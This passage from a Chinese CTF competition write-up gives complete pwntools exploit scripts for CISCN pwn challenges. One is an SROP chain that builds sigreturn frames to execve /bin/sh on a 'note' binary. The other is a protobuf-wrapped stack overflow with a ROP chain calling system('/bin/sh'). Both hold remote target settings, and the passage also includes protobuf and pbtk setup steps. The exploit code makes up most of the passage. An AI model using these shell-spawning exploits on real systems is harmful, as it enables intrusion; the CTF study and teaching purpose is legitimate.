class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>    <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./note&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc-2.31.so&#x27;</span>)    <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">35414</span>)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">text</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,text)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">b&#x27;choice &gt;&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    sla(<span class="hljs-string">b&#x27;: &#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment"># for i in range(8):</span><br><span class="hljs-comment">#     add(b&#x27;a&#x27;*0x200)</span><br><br><br>add(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span>)<br><br><br>pop_rax_rbp = <span class="hljs-number">0x0404408</span><br>pop_rdx = <span class="hljs-number">0x47a8fa</span><br>syscall = <span class="hljs-number">0x040316c</span><br><span class="hljs-comment"># xchg_edi_eax = 0x0465d09</span><br>rdi = <span class="hljs-number">0x0462946</span><br>rsi = <span class="hljs-number">0x0475834</span><br><span class="hljs-comment"># mov qword ptr [rsi], rax ; add rsp, 0x60 ; pop rbp ; ret</span><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">0</span><br>sigframe.rdi = <span class="hljs-number">0</span><br>sigframe.rsi = <span class="hljs-number">0x558100</span><br>sigframe.rdx = <span class="hljs-number">0x200</span><br>sigframe.rsp = <span class="hljs-number">0x558100</span><br>sigframe.rip = syscall<br><span class="hljs-comment"># pay += bytes(sigframe)</span><br><span class="hljs-comment"># sl(pay)</span><br><br><span class="hljs-comment"># payload = p64(rdi)+p64(0xc00000fde8)+p64(pop_rdx)+p64(0)</span><br><span class="hljs-comment"># payload += p64(pop_rax_rbp)+p64(0x3b)*2 + p64(syscall)</span><br><br>payload = p64(pop_rax_rbp) + p64(<span class="hljs-number">0xf</span>)*<span class="hljs-number">2</span> + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe)<br><br><span class="hljs-comment"># 0xc000112000</span><br>pay1 = p64(<span class="hljs-number">0xc00000fde8</span>)+p64(<span class="hljs-number">0x100</span>)<br>pay1 = pay1*(<span class="hljs-number">0x40</span>//<span class="hljs-number">0x10</span>)<br><br>pay2 = p64(<span class="hljs-number">0xc00000fde8</span>)+p64(<span class="hljs-number">0x100</span>)<br>pay2 = pay1*(<span class="hljs-number">0x300</span>//<span class="hljs-number">0x10</span>)<br><span class="hljs-comment"># pause()</span><br><span class="hljs-comment"># dbg(&#x27;b *0x047Fa35&#x27;)</span><br>edit(<span class="hljs-number">1</span>,pay1 + payload + pay2 +<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">0x3b</span><br>sigframe.rdi = <span class="hljs-number">0x558218</span><br>sigframe.rsi = <span class="hljs-number">0</span><br>sigframe.rdx = <span class="hljs-number">0</span><br>sigframe.rsp = <span class="hljs-number">0x558100</span><br>sigframe.rip = syscall<br><br>pay2 = p64(pop_rax_rbp) + p64(<span class="hljs-number">0xf</span>)*<span class="hljs-number">2</span> + p64(syscall) + <span class="hljs-built_in">bytes</span>(sigframe)<br>pause()<br>sl(pay2+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h2><p>唉，以前偷懒，就没复现过protobuf，也没有这类的工具，没想到线下出了，题目很简单，就是普通栈溢出</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p><a href="https://github.com/protocolbuffers/protobuf/releases/tag/v3.21.9%EF%BC%8C%E4%B8%8B%E8%BD%BDprotobuf">https://github.com/protocolbuffers/protobuf/releases/tag/v3.21.9，下载protobuf</a></p><p>root用户下解压文件执行下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xzvf protobuf-cpp-3.21.9.tar.gz<br><span class="hljs-built_in">cd</span> protobuf-3.21.9<br>./autogen.sh<br>./configure --prefix=/usr/local/protobuf<br>make -j8 &amp;&amp; make install<br>ldconfig<br></code></pre></td></tr></table></figure><p>更新环境变量</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># 在/etc/profile文件中添加下面两行</span><br>export <span class="hljs-variable constant_">PATH</span>=<span class="hljs-variable">$PATH</span><span class="hljs-symbol">:/usr/local/protobuf/bin/</span><br>export <span class="hljs-variable constant_">PKG_CONFIG_PATH</span>=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/protobuf/lib</span><span class="hljs-regexp">/pkgconfig/</span><br><span class="hljs-comment"># 然后执行</span><br>source /etc/profile<br></code></pre></td></tr></table></figure><p>配置动态链接库</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 在文件/etc/ld.so.conf中添加下面一行</span><br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/protobuf/</span>lib <span class="hljs-comment">#（注意: 在新行处添加）</span><br> <br><span class="hljs-comment"># 更改完成之后执行下面的命令</span><br>ldconfig<br></code></pre></td></tr></table></figure><h3 id="下载pbtk工具"><a href="#下载pbtk工具" class="headerlink" title="下载pbtk工具"></a>下载pbtk工具</h3><p>如果题目没有删除protobuf标志的话可以借助此工具，删除的话只能自己去看了</p><p><a href="https://github.com/marin-m/pbtk%EF%BC%8C%E6%AD%A4%E9%93%BE%E6%8E%A5%E4%B8%8B%E8%BD%BD">https://github.com/marin-m/pbtk，此链接下载</a></p><p>然后运行如下配置相关环境</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip3 <span class="hljs-keyword">install</span> protobuf<br>pip3 <span class="hljs-keyword">install</span> google<br>pip3 <span class="hljs-keyword">install</span> protobuf<br></code></pre></td></tr></table></figure><p>最后运行命令生产py文件</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">你下载的pbtk路径<span class="hljs-string">/extractors/from_binary.py</span> 题目文件 存放路径<br><span class="hljs-comment">#生产.proto文件</span><br>protoc -I=<span class="hljs-string">./</span> <span class="hljs-params">--python_out=</span><span class="hljs-string">./</span> 生成的<span class="hljs-string">.proto</span><br><span class="hljs-comment">#得到py文件，接着就可以导入库做题了</span><br></code></pre></td></tr></table></figure><p>下面是生成的proto文件内容</p><img src="/2024/06/24/%E5%8D%8E%E4%B8%ADciscn/4.png" class=""><p>最后exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>    <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br><span class="hljs-comment"># libc = ELF(&#x27;/home/pw/pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&#x27;)    </span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;pwn-5519381bfe.challenge.xctf.org.cn&quot;</span>, <span class="hljs-number">9999</span>, ssl=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br><span class="hljs-keyword">import</span> message_pb2<br><span class="hljs-keyword">import</span> sys<br><br>ru(<span class="hljs-string">b&#x27;Gift: &#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">b&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>system,binsh = sb(libc_base)<br>rdi = libc_base + <span class="hljs-number">0x10f75b</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">payload</span>):<br>    msg = message_pb2.protoMessage()<br>    msg.name = <span class="hljs-string">&quot;1&quot;</span><br>    msg.phoneNumber = <span class="hljs-string">&quot;1&quot;</span><br>    msg.buffer = payload<br>    msg.size = <span class="hljs-built_in">len</span>(payload)<br>    serialized_msg = msg.SerializeToString()<br>    s(serialized_msg)<br><br><span class="hljs-comment"># dbg()</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x218</span> + p64(rdi+<span class="hljs-number">1</span>) + p64(rdi) + p64(binsh) + p64(system)<br>pwn(payload)<br><br>pwpw()<br></code></pre></td></tr></table></figure><h2 id="strlink"><a href="#strlink" class="headerlink" title="strlink"></a>strlink</h2><p>零解题，比赛时也没咋看，赛后太懒了也不想做，开摆拉</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比赛经验太少了，uaf修洞check一直不通过，还不如别人一个nop解决，还是太菜拉，应该可以带队友拿个二等奖的</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
